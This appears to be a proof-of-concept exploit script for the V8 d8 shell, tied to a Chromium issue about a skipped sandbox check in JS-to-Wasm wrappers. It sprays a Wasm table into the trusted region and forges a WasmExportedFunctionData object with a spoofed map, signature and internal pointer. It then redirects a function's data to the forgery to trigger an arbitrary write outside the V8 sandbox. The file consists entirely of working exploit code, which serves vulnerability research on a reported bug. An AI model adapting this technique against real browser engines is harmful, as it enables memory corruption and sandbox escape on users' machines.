/*
    https://issues.chromium.org/issues/354355045
    Avoid sbxcheck in JSToWasm and JSToJS Wrapper

*/

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");



let builder = new WasmModuleBuilder();
let $arr = builder.addArray(kWasmI32, true);
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_s_v = builder.addType(makeSig([], [wasmRefType($struct)]));
let $sig_arr_i = builder.addType(makeSig([kWasmI32], [wasmRefType($arr)]));
let $boom = builder.addFunction('boom', $sig_v_ll)
  .exportFunc()
  .addBody([
  ]);
let $writer = builder.addFunction('writer', $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $get_struct = builder.addFunction('get_struct', $sig_s_v)
  .exportFunc()
  .addBody([
    kGCPrefix, kExprStructNewDefault, $struct,
  ]);
let $get_arr = builder.addFunction('get_arr', $sig_arr_i)
  .exportFunc()
  .addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprArrayNewDefault, $arr,
  ]);
const table_cnt = 0x400000;
const table_size = table_cnt * 0x10;  // approx size
let $table = builder
  .addTable(wasmRefType($sig_v_ls), table_cnt, table_cnt, [kExprRefFunc, $writer.index])
  .exportAs('table');   // spray addresses on trusted region

let instance = builder.instantiate();
let { boom, writer, get_struct, get_arr, table } = instance.exports;

// trigger lazy compilation + tier-up to avoid WasmLiftoffFrameSetup
let struct = get_struct();
for (let i = 0; i < 0x100000; i++) {
  writer(0n, struct);
}

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kTaggedSize = 4;
const kWasmArrayElementOffset = 0xc;
const kJSFunctionSFIOffset = 0x10;
const kSharedFunctionInfoTrustedFunctionDataOffset = 4;
const kSharedFunctionInfoFunctionDataOffset = 8;
const kWasmFunctionDataProtectedInternalOffset = 0x14;
const kWasmExportedFunctionDataWrapperBudgetOffset = 0x20;
const kWasmExportedFunctionDataSigOffset = 0x30;
const kWasmReturnCountOffset = 0;
const kWasmParameterCountOffset = kWasmReturnCountOffset + 8;
const kWasmSigTypesOffset = kWasmParameterCountOffset + 8;
const kSignatureSize = kWasmSigTypesOffset + 8;
const kI64 = 2;
const WasmExportedFunctionDataMap = 0x00001e4d;
const cage_base = BigInt(Sandbox.base);
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}

// scratchpad region within sandbox
let arr = get_arr(0x100000);
let arr_ptr = getPtr(arr);
let fake_wrapper_budget = arr_ptr + kWasmArrayElementOffset;
let fake_signature = fake_wrapper_budget + kTaggedSize * 2;   // ^ Cell: map, object
let fake_reps = fake_signature + kSignatureSize;              // ^ Sig: retcnt, paramcnt, *i32
let fake_wefd = fake_reps + 4 * 2;                            // ^ reps: *i32 (ValueType bitfield)
let fake_internal = table_size / 2 + 8 + kHeapObjectTag;      // trusted region

// set map to bypass SBXCHECK
setField(fake_wefd, 0, WasmExportedFunctionDataMap);

// set wrapper_budget
setField(fake_wrapper_budget, 4, 0x1000 << kSmiTagSize);  // set wrapper_budget.value = SmiConstant(0x1000)
setField(fake_wefd, kWasmExportedFunctionDataWrapperBudgetOffset, fake_wrapper_budget);

// set sig
setField(fake_reps, 0, kI64);
setField(fake_reps, 4, kI64);
setField64(fake_signature, 0, 0n);  // retcnt
setField64(fake_signature, 8, 2n);  // paramcnt
setField64(fake_signature, 0x10, cage_base + BigInt(fake_reps - kHeapObjectTag)); // *i32
setField64(fake_wefd, kWasmExportedFunctionDataSigOffset, cage_base + BigInt(fake_signature - kHeapObjectTag));

// set internal
setField(fake_wefd, kWasmFunctionDataProtectedInternalOffset, fake_internal);

// set tfd = 0 to fall back to in-sandbox fd usage
let boom_sfi = getField(getPtr(boom), kJSFunctionSFIOffset);
setField(boom_sfi, kSharedFunctionInfoTrustedFunctionDataOffset, 0);
setField(boom_sfi, kSharedFunctionInfoFunctionDataOffset, fake_wefd);

// trigger arbitrary write
boom(0x42n, BigInt(Sandbox.targetPage) - 7n);